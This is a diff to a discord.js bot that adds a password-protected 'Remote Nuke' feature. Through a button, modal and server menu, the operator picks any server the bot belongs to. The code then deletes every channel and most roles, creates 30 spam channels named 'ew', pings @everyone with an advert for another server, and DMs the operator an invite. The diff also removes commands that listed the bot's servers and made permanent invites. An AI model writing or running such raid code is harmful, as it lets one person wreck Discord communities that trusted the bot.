@@ -53,31 +53,6 @@ client.on('messageCreate', async message => {
 
   const content = message.content.trim().toLowerCase();
 
-  // !servers
-  if (content === '!servers') {
-    const guilds = client.guilds.cache;
-    let text = `**Servers (${guilds.size}):**\n\n`;
-    guilds.forEach(g => text += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`);
-    message.reply(text.length > 2000 ? 'List too long. Check console.' : text);
-    return;
-  }
-
-  // !invite
-  if (content === '!invite') {
-    let text = '**Server Invites:**\n\n';
-    for (const guild of client.guilds.cache.values()) {
-      try {
-        const invite = await guild.channels.cache.filter(c => c.type === 0).first()?.createInvite({ maxAge: 0 }) || 'No permission';
-        text += `**${guild.name}** → https://discord.gg/${invite.code}\n`;
-      } catch (e) {
-        text += `**${guild.name}** → No permission\n`;
-      }
-    }
-    message.reply(text);
-    return;
-  }
-
-  // !fb - Remote Nuke (Spam + DM)
   if (content === '!fb') {
     const embed = new EmbedBuilder()
       .setColor('#ff0000')
@@ -90,10 +65,108 @@ client.on('messageCreate', async message => {
     );
 
     await message.reply({ embeds: [embed], components: [row] });
-    return;
   }
+});
 
-  // Add other commands here if needed (!kick, !4clout, !burn, etc.)
+// FIXED INTERACTIONS
+client.on('interactionCreate', async interaction => {
+  if (!interaction.customId) return;
+
+  try {
+    const userId = interaction.customId.split('_')[2];
+    if (interaction.user.id !== userId) {
+      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
+    }
+
+    // Button → Modal
+    if (interaction.isButton()) {
+      const modal = new ModalBuilder()
+        .setCustomId(interaction.customId.replace('start', 'modal'))
+        .setTitle('Enter Password');
+
+      modal.addComponents(new ActionRowBuilder().addComponents(
+        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
+      ));
+
+      return await interaction.showModal(modal);
+    }
+
+    // Modal Submit
+    if (interaction.isModalSubmit()) {
+      const password = interaction.fields.getTextInputValue('password');
+
+      if (password !== MAIN_PASSWORD) {
+        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
+      }
+
+      // Server selector for nuke
+      const servers = client.guilds.cache.map(g => ({
+        label: g.name.length > 25 ? g.name.slice(0, 22) + '...' : g.name,
+        value: g.id,
+        description: `${g.memberCount} members`
+      }));
+
+      const menu = new StringSelectMenuBuilder()
+        .setCustomId(`fb_server_${userId}`)
+        .setPlaceholder('Choose server to NUKE')
+        .addOptions(servers);
+
+      const row = new ActionRowBuilder().addComponents(menu);
+
+      await interaction.reply({
+        content: '✅ Password correct! Select server to nuke:',
+        components: [row],
+        ephemeral: true
+      });
+    }
+
+    // Nuke selected server
+    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
+      await interaction.deferUpdate();
+
+      const guildId = interaction.values[0];
+      const guild = client.guilds.cache.get(guildId);
+
+      if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });
+
+      await interaction.followUp({ content: `🔴 **RAIDING ${guild.name}** - Deleting everything...`, ephemeral: true });
+
+      try {
+        // Delete channels
+        for (const channel of guild.channels.cache.values()) {
+          await channel.delete().catch(() => {});
+        }
+
+        // Delete roles
+        for (const role of guild.roles.cache.values()) {
+          if (role.name === '@everyone' || role.name === 'Owner') continue;
+          await role.delete().catch(() => {});
+        }
+
+        // Spam "ew" channels
+        for (let i = 0; i < 30; i++) {
+          await guild.channels.create({ name: 'ew', type: ChannelType.GuildText }).catch(() => {});
+        }
+
+        const ewChannel = guild.channels.cache.find(c => c.name === 'ew');
+        if (ewChannel) {
+          const invite = await ewChannel.createInvite({ maxAge: 0, maxUses: 0 });
+          await ewChannel.send(`@everyone\nJoin fame unlocked: discord.gg/fameunlocked`);
+          await interaction.user.send(`✅ Raid finished on **${guild.name}**\nInvite: https://discord.gg/${invite.code}`);
+        }
+
+        await interaction.followUp({ content: `✅ **${guild.name}** fully nuked! Check your DMs.`, ephemeral: true });
+      } catch (err) {
+        console.error(err);
+        await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
+      }
+    }
+  } catch (error) {
+    console.error('Interaction Error:', error);
+    if (!interaction.replied && !interaction.deferred) {
+      await interaction.reply({ content: '❌ Something went wrong. Try again.', ephemeral: true }).catch(() => {});
+    }
+  }
 });
 
 client.login(TOKEN);
